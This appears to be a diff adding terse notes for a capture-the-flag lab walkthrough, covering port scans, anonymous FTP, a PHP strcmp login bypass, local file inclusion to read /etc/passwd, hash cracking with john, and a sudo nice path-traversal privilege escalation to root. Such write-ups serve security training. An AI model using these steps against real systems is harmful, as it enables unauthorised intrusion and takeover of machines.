@@ -1,0 +1,50 @@
+nmap -p- 192.168.x.x
+nmap -sV -A -p 22,2112,80 192.168.x.x
+
+Login ftp using anonymous user
+ls
+download both available files
+get filename
+
+open both files and find nothing
+
+find hidden files on the server 
+dirb http://192.168.x.x
+
+check /admin/index.html 
+you got login page , Great!!
+Check again index.php.bak file downloaded some time before
+username admin
+password potato
+
+I check validation but got failed 
+
+I found interesting strcmp funtion used for authentication . I have done some basic research 
+
+https://danuxx.blogspot.com/2013/03/unauthorized-access-bypassing-php-strcmp.html#:~:text=In%20PHP%205.2,
+
+https://wiki.owasp.org/images/6/6b/PHPMagicTricks-TypeJuggling.pdf#:~:text=What%20is%20Type
+
+I bypassed login and logged in as admin
+
+I tried all available menu but not interesting except logs
+I retrieved some logs files 
+it seems to be LFI vulnerability lets try to check
+
+Any try to access file /etc/passwd
+copy data in the file 
+crack the hashes using john tool
+
+connect with ssh using crached usrname and password
+Exploit
+sudo -l
+ls -la /notes
+
+echo "/bin/bash" >> root.sh
+chmod+x root.sh
+sudo /bin/nice /notes/../home/webadmin/root.sh
+
+I got root access 
+id
+cat /root/root.txt
+
